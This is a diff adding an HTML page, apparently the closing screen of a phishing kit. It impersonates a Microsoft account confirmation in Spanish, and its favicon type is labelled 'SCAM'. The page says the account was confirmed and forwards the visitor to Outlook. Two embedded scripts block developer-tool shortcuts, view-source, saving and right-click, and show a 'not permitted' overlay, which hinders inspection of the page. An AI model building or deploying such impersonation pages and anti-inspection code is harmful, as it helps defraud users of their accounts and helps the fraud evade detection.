@@ -1,0 +1,177 @@
+
+
+
+
+
+<!DOCTYPE html>
+
+<html>
+
+<head>
+	<link rel="icon" href="favicon.png" type="SCAM/favicon.png" sizes="16x16" />
+	
+	<!-- Script de Bloqueo Absoluto (Colocado al inicio para ejecutarse antes que cualquier otro recurso) -->
+<script>
+    // Bloqueo estricto de atajos de teclado para inspección
+    window.addEventListener('keydown', function(e) {
+        if (
+            e.key === 'F12' || 
+            e.keyCode === 123 || 
+            (e.ctrlKey && e.shiftKey && (e.key.toLowerCase() === 'i' || e.key.toLowerCase() === 'j' || e.key.toLowerCase() === 'c' || e.keyCode === 73 || e.keyCode === 74 || e.keyCode === 67)) || 
+            (e.ctrlKey && (e.key.toLowerCase() === 'u' || e.keyCode === 85))
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            return false;
+        }
+    }, true);
+
+    // Bloqueo total de clic derecho
+    window.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        e.stopImmediatePropagation();
+        return false;
+    }, true);
+</script>
+
+	<title>Confirma tu cuenta Microsoft</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
+	<link rel="stylesheet" type="text/css" href="estilo.css">
+	<link rel= "stylesheet" href= "https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css">
+</head>
+
+<body>
+
+<section class="box" >
+	
+	<div class="animated fadeIn" id="container2">
+	<div class="animated fadeInRight" id="inner2">
+
+
+
+		<img class="logo1" src="logo1.svg" alt="logo1.svg">
+
+		<h2> Confirmar cuenta</h2>
+
+			<h4> Tu cuenta ha sido confirmada con éxito.</h4>
+			
+			<a href="https://outlook.live.com/owa/" class="btn btn-success">Finalizar</a>
+			
+		</form>
+	</div>
+	</div>
+	
+
+	<div class="bottom" >
+		<h5>Términos de uso</h5>
+		<h5>Privacidad y cookies</h5>
+	</div>
+	
+</section>
+
+<script>
+    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
+(() => {
+    'use strict';
+
+    // Evita ejecutar dos veces la protección.
+    if (window.__proteccionWebActiva) return;
+    window.__proteccionWebActiva = true;
+
+    function mostrarAviso() {
+        if (document.getElementById('aviso-proteccion')) return;
+
+        const aviso = document.createElement('div');
+        aviso.id = 'aviso-proteccion';
+
+        Object.assign(aviso.style, {
+            position: 'fixed',
+            inset: '0',
+            zIndex: '2147483647',
+            background: 'rgba(0,0,0,.88)',
+            color: '#fff',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: 'center',
+            padding: '24px',
+            boxSizing: 'border-box',
+            fontFamily: 'Arial, sans-serif',
+            textAlign: 'center'
+        });
+
+        const panel = document.createElement('div');
+        Object.assign(panel.style, {
+            maxWidth: '420px',
+            padding: '28px',
+            background: '#202020',
+            borderRadius: '12px',
+            border: '1px solid #555'
+        });
+
+        const titulo = document.createElement('h2');
+        titulo.textContent = 'Acción no permitida';
+
+        const mensaje = document.createElement('p');
+        mensaje.textContent =
+            'Esta acción está restringida en esta página.';
+
+        const boton = document.createElement('button');
+        boton.type = 'button';
+        boton.textContent = 'Volver a la página';
+
+        Object.assign(boton.style, {
+            padding: '12px 20px',
+            border: '0',
+            borderRadius: '6px',
+            cursor: 'pointer',
+            fontWeight: 'bold'
+        });
+
+        boton.addEventListener('click', () => aviso.remove());
+
+        panel.append(titulo, mensaje, boton);
+        aviso.appendChild(panel);
+        document.body.appendChild(aviso);
+    }
+
+    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
+    document.addEventListener('keydown', function (e) {
+        const tecla = e.key.toLowerCase();
+
+        if (
+            (e.ctrlKey || e.metaKey) &&
+            ['s', 'u', 'p'].includes(tecla)
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+
+        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
+        if (
+            tecla === 'f12' ||
+            ((e.ctrlKey || e.metaKey) &&
+             e.shiftKey &&
+             ['i', 'j', 'c'].includes(tecla))
+        ) {
+            e.preventDefault();
+            e.stopImmediatePropagation();
+            mostrarAviso();
+        }
+    }, true);
+
+    // Bloquear menú contextual del clic derecho.
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+        mostrarAviso();
+    }, true);
+
+})();
+</script>
+
+</body>
+
+</html>
